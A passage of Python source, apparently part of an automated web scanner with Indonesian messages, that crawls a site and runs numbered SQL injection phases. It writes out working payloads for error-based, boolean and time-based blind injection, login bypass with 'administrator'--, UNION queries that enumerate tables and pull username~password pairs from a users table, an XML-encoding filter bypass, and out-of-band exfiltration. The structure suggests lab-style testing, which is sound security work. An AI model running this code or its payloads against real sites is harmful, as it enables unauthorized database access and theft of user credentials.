                if not name or field.has_attr("disabled"):
                    continue
                typ = (field.get("type") or "").lower() or field.name
                if typ in {"password"}:
                    has_password = True
                if typ in {"submit", "button", "image", "reset", "file"}:
                    continue
                value = str(field.get("value") or "")
                if field.name == "textarea":
                    value = field.text or ""
                elif field.name == "select":
                    selected = field.find("option", selected=True) or field.find("option")
                    value = str(selected.get("value") or selected.text or "") if selected else ""
                fields.append((name, value[:500], typ))
            forms.append(FormSpec(base, action, method, tuple(fields), has_password))
        return forms

    # ------------------------------------------------------------------
    # Point building (dedupe logis: parameter/path, bukan URL penuh)
    # ------------------------------------------------------------------
    def _build_points(self) -> None:
        points: list[Point] = []
        seen: set[tuple[str, str, str]] = set()

        def add(point: Point) -> None:
            if point.key not in seen:
                seen.add(point.key)
                points.append(point)

        for page in self.pages:
            parsed = urlparse(page.url)
            for name, value in parse_qsl(parsed.query, keep_blank_values=True):
                if has_volatile_query_value(name, value):
                    continue
                path = parsed.path or "/"
                key = f"query|{path}|{name}"
                add(Point(
                    key=key, kind="query", label=f"query `{name}`",
                    url=canonical_url(page.url), name=name,
                    original=value or "1", page_url=page.url,
                    interest=self._interest_for_name(name),
                ))
            for form in page.forms:
                if form.method != "get" or form.has_password:
                    continue
                action_path = urlparse(form.action).path or "/"
                if DESTRUCTIVE_PATH_RE.search(action_path):
                    continue
                for name, value, typ in form.fields:
                    if typ in {"password", "checkbox", "radio", "hidden"}:
                        continue
                    key = f"form|{form.method}|{action_path}|{name}"
                    add(Point(
                        key=key, kind="form", label=f"form `{name}`",
                        url=form.action, name=name,
                        original=value or "1", page_url=page.url,
                        method=form.method.upper(), fields=form.fields,
                        interest=self._interest_for_name(name),
                    ))
        cookie_pages: dict[str, tuple[str, str]] = {}
        for page in self.pages:
            for name, value in page.cookie_names.items():
                cookie_pages.setdefault(name, (page.url, value or ""))
        for name, (page_url, value) in cookie_pages.items():
            path = urlparse(page_url).path or "/"
            key = f"cookie|{path}|{name}"
            if re.search(r"(session|sid|php|csrf|auth)", name, re.I):
                interest = 0
            else:
                interest = self._interest_for_name(name) + 2
            add(Point(
                key=key, kind="cookie", label=f"cookie `{name}`",
                url=canonical_url(page_url), name=name,
                original=value or "guest", page_url=page_url,
                interest=interest,
            ))
        for endpoint, page_url, field_name in self._xml_candidates():
            key = f"xml|{urlparse(endpoint).path}|{field_name}"
            add(Point(
                key=key, kind="xml", label=f"xml `{field_name}`",
                url=endpoint, name=field_name, original="1", page_url=page_url,
                method="POST", interest=4,
            ))
        self.points = sorted(points, key=lambda p: (-p.interest, p.kind, p.label))[: self.max_points]
        self.stats["xml_endpoints"] = sum(1 for p in self.points if p.kind == "xml")

    @staticmethod
    def _interest_for_name(name: str) -> int:
        lowered = name.lower()
        score = 1
        for token, bonus in (
            ("product", 5), ("category", 5), ("store", 5), ("stock", 5),
            ("user", 4), ("name", 4), ("search", 4), ("id", 3), ("tracking", 4), ("track", 4),
        ):
            if token in lowered:
                score += bonus
        return score

    def _xml_candidates(self) -> list[tuple[str, str, str]]:
        candidates: list[tuple[str, str, str]] = []
        seen: set[tuple[str, str]] = set()
        for page in self.pages:
            text = (page.text or "") + "\n" + (page.js_text or "")
            low = text.lower()
            if not re.search(r"stockcheck|checkstock|storeid|stockapi|check stock", low):
                continue
            found: list[str] = []
            for match in re.finditer(r"""['"]([^'"]{1,220})['"]""", text):
                candidate = match.group(1).strip()
                if not candidate.startswith("/") or candidate.startswith("//"):
                    continue
                if re.search(r"(stock|check|inventory|xml|soap|api)", candidate, re.I):
                    found.append(urljoin(page.url, candidate))
            for match in re.finditer(r"(?:fetch|axios\.post|\.post|\.open)\s*\(\s*(?:['\"][A-Z]+['\"]\s*,\s*)?['\"]([^'\"]{1,220})['\"]", text, re.I):
                candidate = match.group(1).strip()
                if candidate.startswith("/"):
                    found.append(urljoin(page.url, candidate))
            if not found and ("/product" in (urlparse(page.url).path or "")):
                found.append(urljoin(page.url, "/product/stock"))
            for endpoint in dict.fromkeys(found):
                if not self._same_origin(endpoint):
                    continue
                for field_name in ("storeId", "productId"):
                    if (endpoint, field_name) not in seen:
                        seen.add((endpoint, field_name))
                        candidates.append((endpoint, page.url, field_name))
        return candidates[:4]

    # ------------------------------------------------------------------
    # Baseline & helpers
    # ------------------------------------------------------------------
    def baseline(self, point: Point) -> Baseline | None:
        if point.key in self._baselines:
            return self._baselines[point.key]
        r1 = self.send(point)
        if not self._within_budget():
            self._baselines[point.key] = None
            return None
        r2 = self.send(point)
        if r1.error or r2.error or r1.status is None or r2.status is None:
            self._baselines[point.key] = None
            return None
        if r1.status >= 500 or r2.status >= 500 or r1.status in (404, 405):
            self._baselines[point.key] = None
            return None
        sim = similarity(r1.normalized, r2.normalized)
        if sim < 0.85:
            self._baselines[point.key] = None
            return None
        base = Baseline(point, r1, r2, sim)
        self._baselines[point.key] = base
        return base

    @staticmethod
    def _quote_prefix(point: Point) -> str:
        return point.original if point.numeric else f"{point.original}'"

    def _inject(self, point: Point, payload: str) -> str:
        prefix = point.original if point.numeric else f"{point.original}'"
        return f"{prefix} {payload}" if not payload.startswith(("[", "(", "'")) else f"{prefix}{payload}"

    def _inject_fragment(self, point: Point, fragment: str) -> str:
        return self._inject(point, fragment)

    def _mark(self, lab_no: int, point: Point, evidence: str, method: str, severity: str | None = None) -> None:
        if lab_no in self._confirmed:
            return
        meta = next(item for item in CATALOG if item[0] == lab_no)
        lab_id = lab_id_for(lab_no)
        self._confirmed[lab_no] = {
            "id": lab_id,
            "status": "confirmed",
            "title": meta[1],
            "method": method,
            "location": point.label,
            "evidence": str(evidence),
            "severity": severity or meta[3],
        }

    def _engage(self, point: Point, base: Baseline) -> bool:
        quote = self.send(point, point.original + ("'" if not point.numeric else ""))
        if has_sql_error(quote):
            return True
        if quote.status is not None and quote.status != base.first.status:
            return True
        if quote.error:
            return False
        sim = similarity(base.first.normalized, quote.normalized)
        length_delta = abs(len(quote.text) - len(base.first.text))
        return sim < 0.93 or length_delta > max(100, len(base.first.text) * 0.2)

    # ------------------------------------------------------------------
    # 13: visible error based
    # ------------------------------------------------------------------
    def phase_visible_error(self, points: list[Point]) -> None:
        if 13 in self._confirmed:
            return
        probes_tpl = [
            lambda v, n: v + "'",
            lambda v, n: v + '"',
            lambda v, n: v + "\\",
            lambda v, n: v + "'-- -",
            lambda v, n: v + "')-- -",
            lambda v, n: v + "' OR '1",
        ]
        for point in points:
            if 13 in self._confirmed or not self._within_budget():
                return
            base = self.baseline(point)
            if not base:
                continue
            base_errs = {e for _, e in sql_errors(base.first)} | {e for _, e in sql_errors(base.second)}
            for tpl in probes_tpl:
                if 13 in self._confirmed or not self._within_budget():
                    return
                try:
                    payload = tpl(point.original, point.numeric)
                except Exception:
                    continue
                resp = self.send(point, payload)
                errs = sql_errors(resp)
                fresh = [(dbms, e) for dbms, e in errs if e not in base_errs]
                if fresh:
                    confirm = self.send(point, payload)
                    if sql_errors(confirm):
                        evid = fresh[0]
                        self._mark(13, point,
                                   f"Error/leak SQL terpicu pada {point.label}: {evid[0]} - {snippet(str(evid[1]),180)}.",
                                   "visible error differential")
                        return

    def _record_count(self, resp: Response) -> int:
        text = resp.text or ""
        patterns = [
            r"/product\?(?:id|productId)=",
            r"class=\"[^\"]*(?:product|item|card)[^\"]*\"",
            r"<tr[^>]*>",
            r"\b(?:Price|Harga)\b",
            r"\b(?:Add to cart|Tambah ke keranjang|Beli sekarang)\b",
        ]
        return max((len(re.findall(p, text, re.I)) for p in patterns), default=0)

    def phase_where_hidden(self, points: list[Point]) -> None:
        for point in points:
            if 1 in self._confirmed:
                return
            base = self.baseline(point)
            if not base:
                continue
            if point.numeric:
                true_payload = f"{point.original} OR 1=1-- -"
                false_payload = f"{point.original} OR 1=2-- -"
            else:
                true_payload = f"{point.original}' OR '1'='1'-- -"
                false_payload = f"{point.original}' OR '1'='2'-- -"
            true = self.send(point, true_payload)
            false = self.send(point, false_payload)
            if true.error or false.error:
                continue
            base_count = max(1, self._record_count(base.first))
            true_count = self._record_count(true)
            false_count = self._record_count(false)
            len_ratio = len(true.text) / max(1, len(base.first.text))
            if (true_count >= base_count + 2 and false_count <= base_count + 1
                    and len_ratio >= 1.15 and true_count != false_count):
                self._mark(1, point,
                           f"Payload WHERE OR 1=1 menampilkan {true_count} record vs baseline {base_count}; OR 1=2 kembali {false_count}.",
                           "WHERE tautology differential")

    # ------------------------------------------------------------------
    # 11: blind conditional responses
    # ------------------------------------------------------------------
    def phase_conditional_responses(self, points: list[Point]) -> None:
        if 11 in self._confirmed:
            return
        for point in points:
            if 11 in self._confirmed or not self._within_budget():
                return
            base = self.baseline(point)
            if not base:
                continue
            v = point.original
            families = []
            if point.numeric:
                families = [(v + " AND 1=1", v + " AND 1=2"), (v + " AND 1=1-- -", v + " AND 1=2-- -")]
            families += [(v + "' AND '1'='1", v + "' AND '1'='2"), (v + "' AND '1'='1'-- -", v + "' AND '1'='2'-- -")]
            for true_pl, false_pl in families:
                if 11 in self._confirmed or not self._within_budget():
                    return
                rounds_ok = True
                t_sims, f_sims, tf_sims, t_lens, f_lens = [], [], [], [], []
                for _ in range(2):
                    t = self.send(point, true_pl)
                    f = self.send(point, false_pl)
                    if t.error or f.error or t.status is None or f.status is None:
                        rounds_ok = False
                        break
                    t_sims.append(similarity(base.first.normalized, t.normalized))
                    f_sims.append(similarity(base.first.normalized, f.normalized))
                    tf_sims.append(similarity(t.normalized, f.normalized))
                    t_lens.append(len(t.text))
                    f_lens.append(len(f.text))
                if not rounds_ok:
                    continue
                mt, mf, mtf = __import__('statistics').median(t_sims), __import__('statistics').median(f_sims), __import__('statistics').median(tf_sims)
                len_gap = abs(__import__('statistics').median(t_lens) - __import__('statistics').median(f_lens))
                if (min(t_sims) >= 0.78 and max(f_sims) <= 0.90 and (mt - mf) >= 0.05) or (len_gap >= 80 and mtf <= 0.93):
                    self._mark(11, point, f"Boolean blind terkonfirmasi pada {point.label} (2 putaran).", "boolean differential")
                    return

    def phase_conditional_errors(self, points: list[Point]) -> None:
        if 12 in self._confirmed:
            return
        for point in points:
            if 12 in self._confirmed or not self._within_budget():
                return
            base = self.baseline(point)
            if not base:
                continue
            v = point.original
            variants = []
            if point.numeric:
                variants.append((v + " AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)=1", v + " AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 1 END)=1"))
            variants.append((v + "' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)=1-- -", v + "' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 1 END)=1-- -"))
            for tp, fp in variants:
                if 12 in self._confirmed or not self._within_budget():
                    return
                t_err = f_err = 0
                valid = True
                for _ in range(2):
                    t = self.send(point, tp)
                    f = self.send(point, fp)
                    if t.error and f.error:
                        valid = False
                        break
                    if has_sql_error(t) or (t.status and t.status >= 500 and not has_sql_error(base.first)):
                        t_err += 1
                    if has_sql_error(f) or (f.status and f.status >= 500 and not has_sql_error(base.first)):
                        f_err += 1
                if not valid:
                    continue
                if t_err == 2 and f_err == 0:
                    self._mark(12, point, f"Conditional error terkonfirmasi pada {point.label}.", "conditional error differential")
                    return

    def phase_login_bypass(self) -> None:
        if 2 in self._confirmed:
            return
        forms = []
        seen = set()
        for page in self.pages:
            for form in page.forms:
                names = " ".join(n for n,_,_ in form.fields).lower()
                is_login = form.has_password or bool(re.search(r"(user|email|login|name).*(pass|password|pwd)|\blogin\b", names))
                if not is_login:
                    continue
                key = (form.action, form.method)
                if key in seen: continue
                seen.add(key)
                forms.append(form)
        for form in forms:
            if 2 in self._confirmed or not self._within_budget():
                return
            if not self._require_origin(form.action): continue
            user_field = next((n for n,_v,t in form.fields if re.search(r"(user|email|login|name)", n, re.I) and t != "password"), None) or "username"
            pass_field = next((n for n,_v,t in form.fields if re.search(r"pass|pwd", n, re.I) or t == "password"), "password")
            wrong_user = f"satria_wrong_{uuid.uuid4().hex[:8]}"
            wrong_pass = f"satria_wrong_{uuid.uuid4().hex[:8]}"
            base = self._login_attempt(form, user_field, wrong_user, pass_field, wrong_pass)
            if base is None: continue
            base_status, base_body, base_location, _ = base
            base_low = (base_body or "").lower()
            if any(m in base_low for m in AUTH_MARKERS): continue
            for payload in ["administrator'--", "' OR '1'='1'-- -", '" OR "1"="1"-- -']:
                for uf, uv, pf, pv in [(user_field, payload, pass_field, wrong_pass)]:
                    attempt = self._login_attempt(form, uf, uv, pf, pv)
                    if not attempt: continue
                    status, body, location, statuses = attempt
                    if status is None: continue
                    low = (body or "").lower()
                    if any(m in low for m in AUTH_FAILURE_MARKERS): continue
                    markers = [m for m in AUTH_MARKERS if m in low]
                    redirect_ok = status in (301,302,303,307,308) and location and not re.search(r"(login|signin|error|invalid)", str(location), re.I)
                    if markers or redirect_ok:
                        self._mark(2, Point(key=f"login|{uf}", kind="form", label=f"form login `{uf}`", url=form.action, name=uf, original=wrong_user, page_url=form.action, method=form.method.upper(), fields=form.fields), f"Login bypass terindikasi pada {form.action}: payload {payload!r} -> HTTP {status}", "login bypass differential")
                        return

    def _login_attempt(self, form: FormSpec, user_field: str, user_value: str,
                       pass_field: str, pass_value: str,
                       field_name: str | None = None, field_value: str | None = None) -> tuple[int | None, str, str, tuple[int | None, ...]] | None:
        session = requests.Session()
        for cookie in self.session.cookies:
            session.cookies.set(cookie.name, cookie.value, domain=cookie.domain, path=cookie.path)
        data = {name: value for name, value, _typ in form.fields}
        data[user_field] = user_value
        data[pass_field] = pass_value
        if field_name and field_value is not None:
            data[field_name] = field_value
        if form.method == "get":
            resp = self._request("GET", form.action, session=session, params=data, allow_redirects=False)
            status = resp.status
            text = resp.text
            location = resp.headers.get("Location", "")
            if resp.is_redirect and location:
                nxt = urljoin(form.action, location)
                if self._same_origin(nxt):
                    followed = self._request("GET", nxt, session=session, allow_redirects=True)
                    return followed.status, followed.text, location, (status, followed.status)
            return status, text, location, (status,)
        resp = self._request("POST", form.action, session=session, data=data, allow_redirects=False)
        status = resp.status
        text = resp.text
        location = resp.headers.get("Location", "")
        if resp.is_redirect and location:
            nxt = urljoin(form.action, location)
            if self._same_origin(nxt):
                followed = self._request("GET", nxt, session=session, allow_redirects=True)
                return followed.status, followed.text, location, (status, followed.status)
        return status, text, location, (status,)

    # ------------------------------------------------------------------
    # UNION helpers
    # ------------------------------------------------------------------
    def _union_value(self, point: Point, core: str, use_dual: bool = False) -> str:
        prefix = point.original if point.numeric else f"{point.original}'"
        suffix = " FROM dual" if use_dual else ""
        return f"{prefix} {core}{suffix}-- -"

    def _column_count(self, point: Point) -> int | None:
        if point.key in self._union_cols:
            return self._union_cols[point.key]
        base = self.baseline(point)
        if not base:
            return None
        n = None
        for candidate in range(1, 9):
            payload = self._union_value(point, f"ORDER BY {candidate}")
            resp = self.send(point, payload)
            if has_sql_error(resp) or (resp.status is not None and resp.status >= 500):
                if candidate > 1:
                    n = candidate - 1
                break
            if candidate == 8:
                n = None
        if n is None:
            # UNION NULL hanya meyakinkan jumlah kolom bila count=k berhasil dan
            # count=k+1 gagal. Jika semua count berhasil, artinya halaman tidak
            # mengeksekusi query (mis. cookie di-ignore) -> jangan menyimpulkan.
            last_good = None
            for count in range(1, 8):
                payload = self._union_value(point, "UNION SELECT " + ",".join(["NULL"] * count))
                resp = self.send(point, payload)
                if not has_sql_error(resp) and (resp.status is None or resp.status < 500):
                    last_good = count
                    continue
                if last_good is not None:
                    n = last_good
                break
            if n is None:
                n = None
        if n:
            self._union_cols[point.key] = n
        return n

    def _union_resp(self, point: Point, exprs: list[str], use_dual: bool = False) -> Response:
        return self.send(point, self._union_value(point, "UNION SELECT " + ",".join(exprs), use_dual))

    def _columns_for(self, point: Point) -> list[int]:
        cached = self._column_count(point)
        return [cached] if cached else [1, 2]

    def _text_column(self, point: Point) -> int | None:
        base = self.baseline(point)
        if not base:
            return None
        if point.key in self._text_col:
            return self._text_col[point.key]
        for cols in self._columns_for(point):
            for index in range(cols):
                tokens = [random_token("satcol") for _ in range(1)]
                exprs = ["NULL"] * cols
                exprs[index] = f"'{tokens[0]}'"
                for use_dual in (False, True):
                    resp = self._union_resp(point, exprs, use_dual)
                    if resp.error:
                        continue
                    if tokens[0] in resp.text and tokens[0] not in base.first.text:
                        self._text_col[point.key] = index
                        return index
        return None

    def phase_union_column_count(self, points: list[Point]) -> None:
        for point in points:
            if 7 in self._confirmed:
                return
            base = self.baseline(point)
            if not base:
                continue
            cols = self._column_count(point)
            if cols:
                self._mark(7, point,
                           f"ORDER BY {cols} diterima dan ORDER BY {cols + 1} gagal pada {point.label}; jumlah kolom query = {cols}.",
                           "ORDER BY / UNION NULL column-count differential")

    def phase_union_text_column(self, points: list[Point]) -> None:
        for point in points:
            if 8 in self._confirmed:
                return
            base = self.baseline(point)
            if not base:
                continue
            cols = self._columns_for(point)
            for col_count in cols:
                for index in range(col_count):
                    token = random_token("sattext")
                    exprs = ["NULL"] * col_count
                    exprs[index] = f"'{token}'"
                    for use_dual in (False, True):
                        resp = self._union_resp(point, exprs, use_dual)
                        if not resp.error and token in resp.text and token not in base.first.text:
                            self._mark(8, point,
                                       f"UNION menempatkan canary unik {token!r} pada kolom ke-{index + 1} dari {col_count} dan tercermin dalam respons.",
                                       "UNION text-column canary")
                            return

    # ------------------------------------------------------------------
    # 03/04: database version
    # ------------------------------------------------------------------
    def phase_db_versions(self, points: list[Point]) -> None:
        for point in points:
            base = self.baseline(point)
            if not base:
                continue
            for cols in self._columns_for(point):
                # Oracle: banner dari v$version.
                if 3 not in self._confirmed:
                    exprs = [NULL_EXPR(cols, "'SATV'||banner")] if False else None
                    variants = [
                        ["'SATV'||banner"] + ["NULL"] * (cols - 1),
                        ["banner"] + ["NULL"] * (cols - 1),
                    ]
                    for exprs2 in variants:
                        resp = self._version_resp(point, exprs2, cols, "FROM v$version")
                        if self._version_seen(resp, base.first.text):
                            self._mark(3, point,
                                       f"UNION SELECT banner FROM v$version mengembalikan: {version_snippet(resp)}.",
                                       "UNION Oracle version (banner)")
                            break
                # MySQL/MSSQL: @@version.
                if 4 not in self._confirmed:
                    variants = [
                        ["CONCAT('SATV',@@VERSION)"] + ["NULL"] * (cols - 1),
                        ["'SATV'+@@VERSION"] + ["NULL"] * (cols - 1),
                        ["@@VERSION"] + ["NULL"] * (cols - 1),
                    ]
                    for exprs2 in variants:
                        resp = self._version_resp(point, exprs2, cols, "")
                        if self._version_seen(resp, base.first.text):
                            self._mark(4, point,
                                       f"UNION SELECT @@VERSION mengembalikan: {version_snippet(resp)}.",
                                       "UNION MySQL/MSSQL version (@@VERSION)")
                            break

    def _version_resp(self, point: Point, exprs: list[str], cols: int, from_clause: str) -> Response:
        core = "UNION SELECT " + ",".join(exprs)
        if from_clause:
            core += " " + from_clause
        return self.send(point, self._union_value_core(point, core))

    def _union_value_core(self, point: Point, core: str) -> str:
        prefix = point.original if point.numeric else f"{point.original}'"
        return f"{prefix} {core}-- -"

    @staticmethod
    def _version_seen(resp: Response, base_text: str) -> bool:
        if resp.error or not resp.text:
            return False
        if "SATV" in resp.text or DB_VERSION_RE.search(resp.text):
            match = DB_VERSION_RE.search(resp.text)
            if "SATV" in resp.text:
                return True
            if match and match.group(0).lower() not in base_text.lower():
                return True
        return False

    # ------------------------------------------------------------------
    # 05/06: listing contents
    # ------------------------------------------------------------------
    def _candidate_tables(self, text: str, base_text: str) -> list[str]:
        words = re.findall(r"[A-Za-z_][A-Za-z0-9_]{2,40}", text or "")
        base_words = set(w.lower() for w in re.findall(r"[A-Za-z_][A-Za-z0-9_]{2,40}", base_text or ""))
        candidates: list[str] = []
        for word in words:
            lowered = word.lower()
            if lowered in COMMON_TABLE_WORDS and lowered not in base_words:
                candidates.append(word)
            elif re.search(r"_[A-Za-z]", word) and lowered not in base_words and word.upper() == word:
                candidates.append(word)
        return list(dict.fromkeys(candidates))

    def phase_listings(self, points: list[Point]) -> None:
        for point in points:
            if 5 in self._confirmed and 6 in self._confirmed:
                return
            base = self.baseline(point)
            if not base: continue
            cols = self._column_count(point) or 2
            if 5 not in self._confirmed and self._within_budget():
                exprs = ["NULL"]*cols; exprs[0] = "table_name"
                resp = self.send(point, self._union_value_core(point, "UNION SELECT " + ",".join(exprs) + " FROM information_schema.tables"))
                if not resp.error:
                    tables = self._candidate_tables(resp.text, base.first.text)
                    if len(tables)>=1 or "users" in (resp.text or "").lower():
                        self._mark(5, point, f"Enumerasi non-Oracle terkonfirmasi: {', '.join(tables[:8])}", "UNION information_schema")
            if 6 not in self._confirmed and self._within_budget():
                exprs = ["NULL"]*cols; exprs[0] = "table_name"
                resp = self.send(point, self._union_value_core(point, "UNION SELECT " + ",".join(exprs) + " FROM all_tables"))
                if not resp.error:
                    tables = self._candidate_tables(resp.text, base.first.text)
                    if len(tables)>=1:
                        self._mark(6, point, f"Enumerasi Oracle terkonfirmasi: {', '.join(tables[:8])}", "UNION all_tables")

    def _credential_rows(self, text: str, base_text: str) -> list[tuple[str, str]]:
        rows: list[tuple[str, str]] = []
        for match in re.finditer(r"([A-Za-z0-9_.@-]{2,40})~([A-Za-z0-9$./=+_-]{6,80})", text or ""):
            user, secret = match.group(1), match.group(2)
            if user.lower() in base_text.lower():
                continue
            if user.lower() in {"sat", "satest", "username", "password"}:
                continue
            rows.append((user, secret))
        return rows

    def _credential_rows_separate(self, text: str, base_text: str) -> list[tuple[str, str]]:
        rows: list[tuple[str, str]] = []
        known_users = {"administrator", "admin", "root", "user", "guest"}
        for match in re.finditer(r"([A-Za-z0-9_.@-]{2,40})\s+([A-Za-z0-9$./=+_-]{6,80})", text or ""):
            user, secret = match.group(1), match.group(2)
            if user.lower() not in known_users:
                continue
            if user.lower() in base_text.lower() or secret.lower() in base_text.lower():
                continue
            rows.append((user, secret))
        return rows

    def phase_other_tables(self, points: list[Point]) -> None:
        for point in points:
            if 9 in self._confirmed and 10 in self._confirmed: return
            base = self.baseline(point)
            if not base: continue
            cols = self._column_count(point) or 2
            exprs = ["NULL"]*cols; exprs[0] = "username||'~'||password"
            core = "UNION SELECT " + ",".join(exprs) + " FROM users"
            resp = self.send(point, self._union_value_core(point, core))
            if resp.error: continue
            rows = self._credential_rows(resp.text, base.first.text)
            if not rows: continue
            user, secret = rows[0]
            if 9 not in self._confirmed:
                self._mark(9, point, f"Data tabel users terambil via UNION: user={user}, password={secret}.", "UNION users table retrieval")
            if 10 not in self._confirmed:
                self._mark(10, point, f"Multi-value dalam satu kolom terkonfirmasi: user={user}, password={secret}.", "UNION single-column multi-value retrieval")

    def _time_payload(self, point: Point, delay: float, dbms: str) -> str:
        v = point.original
        if dbms == "mysql":
            return f"{v}' AND SLEEP({delay})-- -" if not point.numeric else f"{v} AND SLEEP({delay})-- -"
        if dbms == "postgresql":
            return f"{v}' AND (SELECT pg_sleep({delay})) IS NULL-- -" if not point.numeric else f"{v} AND (SELECT pg_sleep({delay})) IS NULL-- -"
        if dbms == "oracle":
            return f"{v}' AND (SELECT DBMS_LOCK.SLEEP({delay}) FROM dual) IS NULL-- -" if not point.numeric else f"{v} AND (SELECT DBMS_LOCK.SLEEP({delay}) FROM dual) IS NULL-- -"
        return f"{v}' AND SLEEP({delay})-- -"

    def _timing_response(self, point: Point, payload: str) -> Response:
        return self.send(point, payload)

    def phase_time_delay(self, points: list[Point]) -> None:
        for point in points:
            if 14 in self._confirmed:
                return
            base = self.baseline(point)
            if not base or base.median_elapsed > 1.5:
                continue
            for dbms in ("mysql", "postgresql", "oracle"):
                payload = self._time_payload(point, self.time_delay, dbms)
                times: list[float] = []
                valid = True
                for _ in range(2):
                    resp = self._timing_response(point, payload)
                    if resp.error or resp.status is None:
                        valid = False
                        break
                    times.append(resp.elapsed)
                    if resp.elapsed < base.median_elapsed + self.time_delay * 0.65:
                        valid = False
                        break
                if valid and times and statistics.median(times) >= base.median_elapsed + self.time_delay * 0.8:
                    self._mark(14, point,
                               f"Payload time delay ({dbms}) menambah median respons menjadi {statistics.median(times):.2f}s vs baseline {base.median_elapsed:.2f}s (duplikasi).",
                               "time-delay differential")
                    return

    def phase_time_information(self, points: list[Point]) -> None:
        for point in points:
            if 15 in self._confirmed:
                return
            base = self.baseline(point)
            if not base or base.median_elapsed > 1.5:
                continue
            candidates = [
                ("mysql", f"{point.original}' AND IF(EXISTS(SELECT 1 FROM users WHERE username='administrator'), SLEEP({self.time_delay}), 0)-- -",
                 f"{point.original}' AND IF(EXISTS(SELECT 1 FROM users WHERE username='satria_no_such_user'), SLEEP({self.time_delay}), 0)-- -"),
                ("postgresql", f"{point.original}' AND (SELECT CASE WHEN EXISTS(SELECT 1 FROM users WHERE username='administrator') THEN pg_sleep({self.time_delay}) ELSE pg_sleep(0) END) IS NULL-- -",
                 f"{point.original}' AND (SELECT CASE WHEN EXISTS(SELECT 1 FROM users WHERE username='satria_no_such_user') THEN pg_sleep({self.time_delay}) ELSE pg_sleep(0) END) IS NULL-- -"),
                ("oracle", f"{point.original}' AND (SELECT DBMS_LOCK.SLEEP({self.time_delay}) FROM dual WHERE EXISTS(SELECT 1 FROM users WHERE username='administrator')) IS NULL-- -",
                 f"{point.original}' AND (SELECT DBMS_LOCK.SLEEP(0) FROM dual WHERE EXISTS(SELECT 1 FROM users WHERE username='satria_no_such_user')) IS NULL-- -"),
            ]
            for dbms, true_payload, false_payload in candidates:
                true_resp = self.send(point, true_payload)
                false_resp = self.send(point, false_payload)
                if true_resp.error or false_resp.error:
                    continue
                if (true_resp.elapsed >= base.median_elapsed + self.time_delay * 0.7
                        and false_resp.elapsed <= base.median_elapsed + 0.5):
                    self._mark(15, point,
                               f"Kondisi berbasis data users pada {point.label} memicu delay ({dbms}: {true_resp.elapsed:.2f}s vs baseline {base.median_elapsed:.2f}s); kondisi salah tidak.",
                               "conditional time-delay information retrieval")
                    return

    # ------------------------------------------------------------------
    # 16/17: OOB
    # ------------------------------------------------------------------
    def phase_oob(self, points: list[Point]) -> None:
        if not self.oob: return
        interaction_found = 16 in self._confirmed
        exfil_found = 17 in self._confirmed
        targets = points if points else [self._dummy_point()]
        for point in targets:
            if interaction_found and exfil_found: break
            if not self._within_budget(): break
            try:
                pair = oob_payloads(point, self.oob)
                interaction_payloads, exfil_payloads = pair[0], pair[1]
            except Exception:
                continue
            for pl in interaction_payloads:
                if not self._within_budget(): break
                self.send(point, pl)
            got = self._poll_oob()
            if got.interactions: interaction_found = True
            if got.values: exfil_found = got.values[0]
            if not exfil_found:
                for pl in exfil_payloads:
                    if not self._within_budget(): break
                    self.send(point, pl)
                got = self._poll_oob()
                if got.interactions: interaction_found = True
                if got.values: exfil_found = got.values[0]
        if interaction_found and 16 not in self._confirmed:
            self._mark(16, targets[0], f"Interaksi OOB unik ({self.oob.token}) tercatat.", "OOB interaction")
        if exfil_found and 17 not in self._confirmed:
            self._mark(17, targets[0], f"Interaksi OOB membawa data exfiltrated: {exfil_found}.", "OOB data exfiltration")

    def _dummy_point(self) -> Point:
        return Point(key="oob|dummy", kind="query", label="endpoint OOB", url=self.target_url,
                     name="oob", original="1", page_url=self.target_url)

    def _poll_oob(self):
        if not self.oob or not self.oob.poll_url:
            return OOBPollResult([], [])
        for _ in range(8):
            try:
                resp = requests.get(self.oob.poll_url, timeout=10)
                resp.raise_for_status()
                interactions = collect_interaction_strings(resp.json(), self.oob.token, self.oob.domain)
                if interactions:
                    vals = extract_exfil_values(interactions[0], self.oob.token, self.oob.domain)
                    return OOBPollResult(interactions[0], vals)
            except Exception as exc:
                self.stats["errors"].append(f"Polling OOB gagal: {type(exc).__name__}: {str(exc)[:120]}")
            time.sleep(1.5)
        return OOBPollResult([], [])

    def phase_xml(self, points: list[Point]) -> None:
        if 18 in self._confirmed: return
        xml_points = [p for p in points if p.kind == "xml"]
        for point in xml_points:
            if 18 in self._confirmed or not self._within_budget(): return
            base_resp = self._xml_request(point, "1", encode=False)
            base_text = base_resp.text or ""
            plain_val = "1 UNION SELECT username||'~'||password FROM users"
            plain = self._xml_request(point, plain_val, encode=False)
            plain_blocked = is_attack_blocked(plain)
            encoded = self._xml_request(point, plain_val, encode=True)
            if encoded.ok_status and not is_attack_blocked(encoded):
                rows = self._credential_rows(encoded.text, base_text)
                if rows and plain_blocked:
                    user, secret = rows[0]
                    self._mark(18, point, f"XML filter bypass terkonfirmasi: data user={user}, password={secret}.", "XML encoding filter bypass")
                    return

    def _xml_request(self, point: Point, value: str, *, encode: bool) -> Response:
        fields = {point.name: xml_hex_encode(value) if encode else value}
        body = build_xml_body(fields)
        return self._request(
            "POST", point.url, data=body,
            headers={"Content-Type": "application/xml; charset=UTF-8", "Accept": "application/xml,text/plain"},
        )

    # ------------------------------------------------------------------
    # Orchestration
    # ------------------------------------------------------------------
    def scan(self) -> dict[str, Any]:
        self.crawl()
        self.phase_visible_error(self.points)
        self.phase_where_hidden(self.points)
        self.phase_login_bypass()
        self.phase_conditional_errors(self.points)
        self.phase_conditional_responses(self.points)
        self.phase_union_column_count(self.points)
        self.phase_union_text_column(self.points)
        self.phase_db_versions(self.points)
        self.phase_listings(self.points)
        self.phase_other_tables(self.points)
        self.phase_time_delay(self.points)
        self.phase_time_information(self.points)
        self.phase_xml(self.points)
        self.phase_oob(self.points)
        # XSS scanning phases (30 tambahan)
        self.phase_xss_reflected_html(self.points)
        self.phase_xss_stored_html(self.points)
        self.phase_xss_dom(self.points)
        self.phase_xss_attribute(self.points)
        self.phase_xss_javascript(self.points)
        self.phase_xss_angularjs(self.points)
        self.phase_xss_template_literal(self.points)
        self.phase_xss_csp_bypass(self.points)
        self.phase_xss_exploitation(self.points)
        self.phase_xss_advanced(self.points)
        # CSRF & Clickjacking (konservatif, berbasis bukti HTTP)
        self.phase_csrf_defenses(self.pages)
        self.phase_csrf_referer(self.pages)
